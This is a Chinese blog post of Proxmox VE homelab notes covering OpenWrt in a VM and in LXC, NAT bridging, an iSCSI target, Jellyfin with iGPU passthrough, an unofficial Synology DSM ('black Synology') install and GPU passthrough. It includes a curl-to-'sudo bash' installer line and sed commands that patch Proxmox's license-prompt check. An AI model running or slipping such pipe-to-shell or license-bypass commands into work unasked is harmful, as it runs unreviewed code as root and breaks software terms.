    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="ProxmoxVE"><a href="#ProxmoxVE" class="headerlink" title="ProxmoxVE"></a><a href="https://pve.proxmox.com/">ProxmoxVE</a></h2><h3 id="使用虚拟机安装Openwrt"><a href="#使用虚拟机安装Openwrt" class="headerlink" title="使用虚拟机安装Openwrt"></a>使用虚拟机安装Openwrt</h3><ul><li><p>正常创建Linux虚拟机，硬盘可以不用进行设置，最终虚拟机设置如下：</p><p><img src="https://img-blog.csdnimg.cn/direct/789181d1d6f240359d6c2920f005f457.png" alt="image-20231209191802964"></p></li><li><p>上传Openwrt的img镜像，复制镜像地址。</p><p><img src="https://img-blog.csdnimg.cn/direct/d973b2c3f84f494694dc3b4f159ab233.png" alt="image-20231209191559642"></p></li><li><p>虚拟机导入镜像磁盘文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">qm importdisk <span class="hljs-number">101</span> <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/vz/</span>template<span class="hljs-regexp">/iso/</span>openwrt-x86-<span class="hljs-number">64</span>-generic-ext4-combined-efi.img local-lvm<br></code></pre></td></tr></table></figure></li><li><p>设置硬盘</p><p><img src="https://img-blog.csdnimg.cn/direct/76725c2112ed494fa063cc0c40f63d05.png" alt="image-20231209192001087"></p></li><li><p>调整引导顺序</p><p><img src="https://img-blog.csdnimg.cn/direct/f8161a008b1e433b83978a53d4069254.png" alt="image-20231209192123989"></p></li><li><p>启动虚拟机</p></li></ul><h3 id="使用LXC容器安装Openwrt"><a href="#使用LXC容器安装Openwrt" class="headerlink" title="使用LXC容器安装Openwrt"></a>使用LXC容器安装Openwrt</h3><p>要点、必须是<code>-rootfs.img</code>、<code>-rootfs.img.gz</code>或者<code>-rootfs.tar.gz</code>的文件<br>     <code>-rootfs.img</code>、<code>-rootfs.img.gz</code>需要解包后打包<br>     <code>-rootfs.tar.gz</code>可以直接使用，如果使用<code>img</code>镜像文件，则需要进行转换。</p><p><strong>img镜像文件转tar.gz操作步骤</strong></p><ul><li><p>安装解包软件</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> squashfs-tools<br></code></pre></td></tr></table></figure></li><li><p>解压</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">gzip -d openwrt-x86-<span class="hljs-number">64</span>-<span class="hljs-keyword">generic</span>-squashfs-rootfs.img.gz<br></code></pre></td></tr></table></figure></li><li><p>解包<code>img</code>文件</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">unsquashfs openwrt-x86-<span class="hljs-number">64</span>-<span class="hljs-keyword">generic</span>-squashfs-rootfs.img<br></code></pre></td></tr></table></figure></li><li><p>进入目录，重新打包为PVE的CT模板，即<code>tar.gz</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> squashfs-root/<br>tar -czf ../openwrt-x86-64-generic-rootfs.tar.gz *<br></code></pre></td></tr></table></figure></li><li><p>上传或复制到PVE对应目录，一般为&#x2F;var&#x2F;lib&#x2F;vz&#x2F;template&#x2F;cache</p></li></ul><p><strong>安装OpenWrt</strong></p><ul><li><p>在pve节点处，选择local(pve)的存储桶，选择CT模板，上传<code>*rootfs.tar.gz</code>系统镜像。</p></li><li><p>使用命令行创建一个id为200，名称为<code>OpenWrt</code>的LXC容器</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pct create <span class="hljs-number">200</span> local:vztmpl/openwrt-x86-<span class="hljs-number">64</span>-generic-rootfs<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> <span class="hljs-attr">--rootfs</span> local:<span class="hljs-number">1</span> <span class="hljs-attr">--ostype</span> unmanaged <span class="hljs-attr">--hostname</span> OpenWrt <span class="hljs-attr">--arch</span> amd64 <span class="hljs-attr">--cores</span> <span class="hljs-number">6</span> <span class="hljs-attr">--memory</span> <span class="hljs-number">1024</span> <span class="hljs-attr">--swap</span> <span class="hljs-number">0</span> <span class="hljs-attr">--onboot</span> yes -net0 bridge=vmbr1,name=eth0<br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">local</span>:vztmpl/openwrt-x86<span class="hljs-number">-64</span>-generic-rootfs.tar.gz<br>容器模板， <span class="hljs-keyword">local</span>:vztmpl/ 指向 /var/lib/vz/<span class="hljs-keyword">template</span>/<span class="hljs-keyword">cache</span>/目录，是pve的默认模板存放目录，webUI上传的模板就存在该位置，可根据需要改为其他目录，<br><br>--rootfs local-lvm:<span class="hljs-number">1</span><br>根磁盘位置，<span class="hljs-keyword">local</span>-lvm可以根据实际情况修改为其他存储位置，<span class="hljs-number">1</span>表示空间大小为<span class="hljs-number">1</span>G。<br><br><span class="hljs-comment">--ostype unmanaged</span><br>系统类型，之后可在设置文件中修改。<br><br><span class="hljs-comment">--hostname OpenWrt</span><br>容器名称，之后可在设置文件中修改<br><br><span class="hljs-comment">--arch amd64</span><br>系统架构，amd64 | arm64 | armhf | i386<br><br><span class="hljs-comment">--cores 6 </span><br>分配给容器的核心数<br><br><span class="hljs-comment">--memory 1024 </span><br>分配给容器的内存大小<br><br><span class="hljs-comment">--swap 0 </span><br>分配给容器的交换区大小<br><br><span class="hljs-comment">--onboot yes </span><br>开机自启动虚拟机<br><br>-net0 bridge=vmbr0,<span class="hljs-type">name</span>=eth0<br>容器网络设置，这里设置网络<span class="hljs-number">0</span>为容器中增加网卡eth0，桥接到主机的vmbr0接口<br></code></pre></td></tr></table></figure></li><li><p>修改OpenWrt的LXC配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>pve<span class="hljs-regexp">/lxc/</span><span class="hljs-number">200</span>.conf<br></code></pre></td></tr></table></figure><p>在其中添加以下数据。</p><figure class="highlight irpf90"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs irpf90"># openwrt.<span class="hljs-keyword">common</span>.conf是PVE自带的openwrt配置文件示例，内含一些基本设置<br>lxc.<span class="hljs-keyword">include</span>: /usr/share/lxc/config/openwrt.<span class="hljs-keyword">common</span>.conf<br>lxc.mount.<span class="hljs-built_in">entry</span>: /dev/net/tun dev/net/tun <span class="hljs-keyword">none</span> <span class="hljs-keyword">bind</span>,create=<span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure></li><li><p>启动OpenWrt即可</p></li></ul><h4 id="可能的问题"><a href="#可能的问题" class="headerlink" title="可能的问题"></a>可能的问题</h4><p><strong>uhttp未启动无法访问OpenWrt主页</strong></p><p>​有些时候可能会遇到uhttpd未启动的情况，使用<code>netstat -nap</code>查看没有80端口开放，可以使用下面命令手动启动服务。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">/usr/sbin/uhttpd -f -h /www -r OpenWrt -x /cgi-bin -u /ubus -t<span class="hljs-number"> 60 </span>-T<span class="hljs-number"> 30 </span>-k<span class="hljs-number"> 20 </span>-A<span class="hljs-number"> 1 </span>-n<span class="hljs-number"> 3 </span>-N<span class="hljs-number"> 100 </span>-R -p 0.0.0.0:80 -p [::]:80 &amp;<br></code></pre></td></tr></table></figure><p><strong>dnsmasq未启动导致DHCP服务失败</strong></p><p>OpenWrt里由于dnsmasq-full用了procd jail，和linux容器冲突导致dnsmasq启动不了，需要手动改一下把procd jail禁用。使用<code>netstat -nap</code>查看有没有53端口开放，修改<code>/etc/init.d/dnsmasq</code>，注释掉下面的部分，执行命令<code>/etc/init.d/dnsmasq restart</code>启动即可。</p><p><img src="https://img-blog.csdnimg.cn/direct/5639e8f94d0f46f2bbafc636c7294fcd.png" alt="image-20231217230509522"></p><h3 id="ProxmoxVE的Openwrt组网方案"><a href="#ProxmoxVE的Openwrt组网方案" class="headerlink" title="ProxmoxVE的Openwrt组网方案"></a>ProxmoxVE的Openwrt组网方案</h3><p>由于<code>ProxmoxVE</code>网络并没有DHCP服务，因此这里使用Openwrt辅助组网，最终实现目标为PVE主机搭建<code>192.168.121.1/24</code>网桥，Openwrt充当DHCP服务器，同时Openwrt充当旁路由设备，最终都通过PVE网桥实现网络通信。</p><ul><li><p>在pve主机上创建网桥<code>vmbr1</code>，本机ip设置为<code>192.168.121.1</code>，用于pve虚拟机组网，配置文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">auto vmbr1<br>iface vmbr1 inet static<br>        address 192.168.121.1/24<br>        ovs_type OVSBridge<br>        post-up <span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward <span class="hljs-comment">#打开IP转发</span><br>        post-up <span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/conf/eno1/proxy_arp <span class="hljs-comment">#代理 ARP 允许一个主机在一个子网上代表另一个主机响应 ARP 请求，ARP 是一种用于将 IP 地址解析为 MAC（Media Access Control）地址的协议</span><br>        <span class="hljs-comment">#转发IPv4流量到虚拟机，使虚拟机与外网联通。</span><br>        <span class="hljs-comment">#SNAT 内网转外网，当内部虚拟器需要访问外网时走这条规则</span><br>        post-up iptables -t nat -A POSTROUTING -s <span class="hljs-string">&#x27;192.168.121.1/24&#x27;</span> -o vmbr0 -j MASQUERADE <span class="hljs-comment"># -A添加规则</span><br></code></pre></td></tr></table></figure></li><li><p>将Openwrt连接指该网桥ip设置为<code>192.168.121.2</code>，做旁旁路由，与传统旁路有不同的是，pve的网桥并没有dhcp服务，因此我们直接使用旁路用Openwrt分配ip信息。</p></li><li><p>登录Openwrt管理界面，直接修改LAN接口配置，同时需要开启DHCP服务，如下所示：</p><p><img src="https://img-blog.csdnimg.cn/direct/de4d5cb05fa94194ac337313e4030f6f.png" alt="image-20231209210241860"></p><p><img src="https://img-blog.csdnimg.cn/direct/5ba9f515cbf642c88ca032f3fdbcb8ab.png" alt="image-20231209210258788"></p></li></ul><h3 id="ProxmoxVE配置iscsi服务"><a href="#ProxmoxVE配置iscsi服务" class="headerlink" title="ProxmoxVE配置iscsi服务"></a>ProxmoxVE配置iscsi服务</h3><ul><li><p>ProxmoxVe配置iscsi服务首先需要安装<code>targetcli-fb</code></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt -y <span class="hljs-keyword">install</span> targetcli-fb<br></code></pre></td></tr></table></figure></li><li><p>iscsi需要预先创建一块固定大小硬盘，这里必须要预先分配，因为iscsi是通过文件大小进行识别的，必须首先填充到指定大小才能正确识别到磁盘大小，使用<code>qemu-img</code>或者<code>dd</code>创建一个即可，下面展示<code>qemu-img</code>创建命令。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-img create -f qcow2 -o preallocation=falloc ./iscsi-storage-<span class="hljs-number">1</span>.qcow2 <span class="hljs-number">100</span>G<br></code></pre></td></tr></table></figure></li><li><p>使用root权限执行<code>targetcli</code>，这里介绍一下，其下目录用途</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">/backstores:后端存储,提供iSCSI底层实际的物理存储设备<br>/backstores/block:用于存放iSCSI服务端配置共享设备<br>/backstores/fileio:用于测试目的的镜像文件<br>/backstores/pscsi:对底层为<br>/backstores/block<br>/iscsi<br>/iscsi/iqn.../tpg1:通过在/iscsi目录执行create命令生成iSCSI target名称时自动生成的与iSCSI target名称同名的目录的子目录<br>/iscsi/iqn.../tpg1/acls:用于存放该存储资源的验证信息<br>/iscsi/iqn.../tpg1/luns:用于存放可访问的可共享硬盘设备<br>/iscsi/iqn.../tpg1/portalsL:用于存放iscsi服务端的ip地址<br>/loopback<br>/vhost<br>/xen-pvscsi<br></code></pre></td></tr></table></figure></li><li><p>创建共享设备，命名为<code>iscsi-1</code>。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/backstores/fileio create <span class="hljs-attribute">name</span>=iscsi-1 <span class="hljs-attribute">file_or_dev</span>=/mnt/badwolf/iscsi/iscsi-storage-1.qcow2<br></code></pre></td></tr></table></figure></li><li><p>进入<code>/iscsi</code>目录创建target名称，将会在<code>iscsi</code>目录下自动生成一个iqn开头的target。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/iscsi create<br></code></pre></td></tr></table></figure></li><li><p>将iSCSI共享资源池中的设备（即之前创建的共享设备）添加到该target。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/iscsi/i</span>qn.......<span class="hljs-regexp">/tpg1/</span>luns create <span class="hljs-regexp">/backstores/</span>fileio/iscsi-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>创建用于验证访问iSCSI服务端共享存储资源的信息，后面的iqn信息可在iscsi客户端查看。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/iscsi/i</span>qn.......<span class="hljs-regexp">/tpg1/</span>acls create iqn.<span class="hljs-number">1991</span>-<span class="hljs-number">05</span>.com.microsoft:desktop-*****<br></code></pre></td></tr></table></figure></li><li><p>设置登录用户名和密码，可选</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/iscsi/iqn<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>./tpg1/acls/iqn.1991-05.com.microsoft:desktop-*****/<span class="hljs-built_in">set</span> auth <span class="hljs-attribute">userid</span>=****<br>/iscsi/iqn<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>./tpg1/acls/iqn.1991-05.com.microsoft:desktop-*****/<span class="hljs-built_in">set</span> auth <span class="hljs-attribute">password</span>=****<br></code></pre></td></tr></table></figure></li><li><p>设置iSCSI服务端的监听IP地址，默认IP地址是<code>0.0.0.0</code>，系统会自动开启3260端口向外提供iSCSI服务。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/iscsi/i</span>qn.......<span class="hljs-regexp">/tpg1/</span>portals create <span class="hljs-number">192.168</span>.<span class="hljs-number">10.10</span><br></code></pre></td></tr></table></figure></li><li><p>保存配置</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">saveconfig</span><br></code></pre></td></tr></table></figure></li><li><p>重启<code>targetd</code>服务</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart targetd</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="Proxmox-VE安装Jellyfin"><a href="#Proxmox-VE安装Jellyfin" class="headerlink" title="Proxmox VE安装Jellyfin"></a>Proxmox VE安装Jellyfin</h3><p>这里直接使用LXC容器安装Jellyfin：</p><ul><li><p>创建debian或者ubuntu的LXC容器，使用无特权容器，虽然官方建议使用特权容器，但是有方法可以使得无特权容器成功开启硬件直通。</p></li><li><p>挂载存储设备</p><ul><li><p>打开LXC配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>pve<span class="hljs-regexp">/lxc/</span><span class="hljs-number">108</span>.conf<br><span class="hljs-comment"># 108是LXC容器的id,修改为自己的</span><br></code></pre></td></tr></table></figure></li><li><p>映射存储设备</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">mp0:</span> <span class="hljs-keyword">/mnt/</span>pve/<span class="hljs-attr">media,mp</span><span class="hljs-operator">=</span><span class="hljs-keyword">/mnt/</span>media<br><span class="hljs-meta">#mp0 是第一个挂载点，如果需要挂载多个的话，按照顺序就是 mp1，mp2，mp3</span><br><span class="hljs-meta">#/mnt/pve/media 就是宿主机上的存储路径，mp=/mnt/media 就是映射到 LXC 里的路径，后续 JellyFin 就是从这个路径去读文件了。</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>共享核显开启硬件加速</p><ul><li><p>首先在LXC里查看video 和 render 组 id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># egrep &#x27;video|render&#x27; /etc/group</span><br>video:x:44:<br>render:x:106:<br></code></pre></td></tr></table></figure></li><li><p>在pve主机上查看video 和 render 组 id</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># egrep &#x27;video|render&#x27; /etc/group</span><br><span class="hljs-attribute">video</span>:x:<span class="hljs-number">44</span>:<br><span class="hljs-attribute">render</span>:x:<span class="hljs-number">105</span>:<br></code></pre></td></tr></table></figure></li><li><p><strong>需要配置好 idmap</strong></p><p><strong>idmap</strong>是一种权限映射机制，它可以将LXC内的uid映射到宿主机上，例如<code>u 0 100000 1005</code> 是说把 LXC 容器里的 uid 0-1004 这 1005 个 uids 映射到 host 上的 100000-101004，格式也就是 <code>LXC起始uid host起始uid 数量</code>。</p><p>因此，我们需要将LXC主机的44映射到主机44，LXC主机的106映射到宿主机105，最终要覆盖0-65535，因此在<code>/etc/pve/lxc/108.conf</code>文件内写入以下内容，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lxc</span>.cgroup2.devices.<span class="hljs-literal">allow</span>: c <span class="hljs-number">226</span>:<span class="hljs-number">0</span> rwm<br><span class="hljs-attribute">lxc</span>.cgroup2.devices.<span class="hljs-literal">allow</span>: c <span class="hljs-number">226</span>:<span class="hljs-number">128</span> rwm<br><span class="hljs-comment"># 226:0和226:128是通过ls -al /dev/dri 获取到的card0和renderD128设备号，一般不会有变化</span><br><span class="hljs-attribute">lxc</span>.mount.entry: /dev/dri dev/dri none bind,optional,create=dir<br><span class="hljs-attribute">lxc</span>.idmap: u <span class="hljs-number">0</span> <span class="hljs-number">100000</span> <span class="hljs-number">1000</span><br><span class="hljs-attribute">lxc</span>.idmap: u <span class="hljs-number">1000</span> <span class="hljs-number">1000</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">lxc</span>.idmap: u <span class="hljs-number">1001</span> <span class="hljs-number">101001</span> <span class="hljs-number">64535</span><br><span class="hljs-attribute">lxc</span>.idmap: g <span class="hljs-number">0</span> <span class="hljs-number">100000</span> <span class="hljs-number">44</span><br><span class="hljs-attribute">lxc</span>.idmap: g <span class="hljs-number">44</span> <span class="hljs-number">44</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">lxc</span>.idmap: g <span class="hljs-number">45</span> <span class="hljs-number">100045</span> <span class="hljs-number">60</span><br><span class="hljs-attribute">lxc</span>.idmap: g <span class="hljs-number">105</span> <span class="hljs-number">103</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">lxc</span>.idmap: g <span class="hljs-number">106</span> <span class="hljs-number">100106</span> <span class="hljs-number">894</span><br><span class="hljs-attribute">lxc</span>.idmap: g <span class="hljs-number">1000</span> <span class="hljs-number">1000</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">lxc</span>.idmap: g <span class="hljs-number">1001</span> <span class="hljs-number">101001</span> <span class="hljs-number">64535</span><br></code></pre></td></tr></table></figure></li><li><p>在pve主机上配置subuid和subgid</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> &#x27;root:<span class="hljs-number">1000</span>:<span class="hljs-number">1</span>&#x27; &gt;&gt; /etc/subuid<br><span class="hljs-attribute">cat</span> &gt;&gt; /etc/subgid &lt;&lt;EOF<br><span class="hljs-attribute">root</span>:<span class="hljs-number">44</span>:<span class="hljs-number">1</span><br><span class="hljs-attribute">root</span>:<span class="hljs-number">105</span>:<span class="hljs-number">1</span><br><span class="hljs-attribute">root</span>:<span class="hljs-number">1000</span>:<span class="hljs-number">1</span><br><span class="hljs-attribute">EOF</span><br></code></pre></td></tr></table></figure></li></ul><p>​       如果没问题的话，启动容器，<code>ls -al /dev/dri</code> 看到的对应组就正确了，而且是 0660 权限！</p><p><img src="https://img-blog.csdnimg.cn/direct/5520665ea65b43dea9149fae7a8928e9.png" alt="image-20240628163726786"></p></li><li><p>官网安装jellyfin</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://repo.jellyfin.org/install-debuntu.sh | <span class="hljs-built_in">sudo</span> bash<br></code></pre></td></tr></table></figure></li><li><p>开启硬件加速</p><p>硬件加速选择QSV或者VAAPI都可以，下面全开。</p><p><img src="https://img-blog.csdnimg.cn/direct/10d0c2048fe9419cb5a289abc9c01064.png" alt="image-20240628162547054"></p></li></ul><h4 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h4><ul><li><p>硬件解码，图像发灰</p><p>硬件解码发灰是因为在不支持HDR的显示器播放HDR视频不会出现画面<em>发灰</em>的情况，此时可以开启jellyfin色彩映射功能。</p><p><img src="https://img-blog.csdnimg.cn/direct/ceb9b0ddec0e41dab16a949a3fe2e655.png" alt="image-20240628162014272"></p><blockquote><p>如果开启后，报播放器错误，那是因为缺少驱动程序，可使用<code>apt-get install intel-opencl-icd</code>进行安装</p></blockquote></li></ul><h3 id="Proxmox-VE安装黑群晖"><a href="#Proxmox-VE安装黑群晖" class="headerlink" title="Proxmox VE安装黑群晖"></a>Proxmox VE安装黑群晖</h3><ul><li><p>PVE正常创建虚拟机</p><ul><li>操作系统选择不适用任何介质</li><li>系统默认</li><li>磁盘总线选择SATA</li><li>CPU默认</li><li>内存默认</li><li>网络模型选择Intel E1000</li></ul></li><li><p>上传黑群晖引导磁盘img，并将其转换为转化为pve支持格式qcow2</p><ul><li><p>转换磁盘格式为qcow2格式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-img convert -p -O qcow2 DS918_7.<span class="hljs-number">21</span>-<span class="hljs-number">69057</span>.img DS918_7.<span class="hljs-number">21</span>-<span class="hljs-number">69058</span>.qcow2<br></code></pre></td></tr></table></figure></li><li><p>虚拟机导入磁盘，注意将虚拟机id修改为自己的id，我这里id是108</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qm</span> importdisk <span class="hljs-number">108</span> DS918_7.<span class="hljs-number">21</span>-<span class="hljs-number">69057</span>.img HDD<br><span class="hljs-comment"># 这里直接导入img格式，经测试也是可以的</span><br><span class="hljs-comment"># 108表示DSM虚拟机在pve上的id编号</span><br><span class="hljs-comment"># HDD表示存储位置为HDD，请修改为自己的</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>修改引导顺序为导入的磁盘，启动，会跑一些代码，等待结束后，去路由器找到虚拟机的ip地址，直接访问。</p></li><li><p>上传官方镜像，安装即可</p><p><img src="https://img-blog.csdnimg.cn/direct/a99146f4b8394f8d80c44512d54564ac.png" alt="image-20240628095001822"></p></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://wp.gxnas.com/11849.html">黑群DSM7.X引导文件（2024年4月11日更新）</a></p><h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><h4 id="Proxmox-VE-6-3-6-4-7-0-7-1-7-2-7-3-7-4-8-0-去掉未订阅的提示"><a href="#Proxmox-VE-6-3-6-4-7-0-7-1-7-2-7-3-7-4-8-0-去掉未订阅的提示" class="headerlink" title="Proxmox VE 6.3 &#x2F; 6.4 &#x2F; 7.0 &#x2F; 7.1 &#x2F; 7.2 &#x2F; 7.3 &#x2F; 7.4 &#x2F; 8.0 去掉未订阅的提示"></a>Proxmox VE 6.3 &#x2F; 6.4 &#x2F; 7.0 &#x2F; 7.1 &#x2F; 7.2 &#x2F; 7.3 &#x2F; 7.4 &#x2F; 8.0 去掉未订阅的提示</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">sed -i_orig <span class="hljs-string">&quot;s/data.status === &#x27;Active&#x27;/true/g&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/pve-manager/</span>js/pvemanagerlib.js<br>sed -i_orig <span class="hljs-string">&quot;s/if (res === null || res === undefined || \!res || res/if(/g&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/javascript/</span>proxmox-widget-toolkit/proxmoxlib.js<br>sed -i_orig <span class="hljs-string">&quot;s/.data.status.toLowerCase() !== &#x27;active&#x27;/false/g&quot;</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/javascript/</span>proxmox-widget-toolkit/proxmoxlib.js<br>systemctl restart pveproxy<br></code></pre></td></tr></table></figure><p>确认无误后，重启服务器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">reboot</span><br></code></pre></td></tr></table></figure><h4 id="Proxmox开启独显直通"><a href="#Proxmox开启独显直通" class="headerlink" title="Proxmox开启独显直通"></a>Proxmox开启独显直通</h4><p>修改&#x2F;etc&#x2F;default&#x2F;grub文件，并在里面找到GRUB_CMDLINE_LINUX_DEFAULT&#x3D;”quiet” 这一行 将这一行替代成下面，目的是开启底层的硬件直通功能。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">GRUB_CMDLINE_LINUX_DEFAULT</span>=<span class="hljs-string">&quot;quiet intel_iommu=on iommu=pt&quot;</span><br></code></pre></td></tr></table></figure><p>然后找到配置文件&#x2F;etc&#x2F;modules 在结尾添加内容，打开pci硬件的直通</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">vfio<br>vfio<span class="hljs-emphasis">_iommu_type1</span><br><span class="hljs-emphasis">vfio_pci</span><br><span class="hljs-emphasis">vfio_</span>virqfd<br></code></pre></td></tr></table></figure><h4 id="Proxmo挂载NTFS格式硬盘"><a href="#Proxmo挂载NTFS格式硬盘" class="headerlink" title="Proxmo挂载NTFS格式硬盘"></a>Proxmo挂载NTFS格式硬盘</h4><p>编辑 &#x2F;etc&#x2F;fstab 文件，添加如下行：</p><p>其中 UUID&#x3D;**** 是指定卷（分区）的 UUID，可以使用 blkid 命令查看 UUID 。</p><figure class="highlight 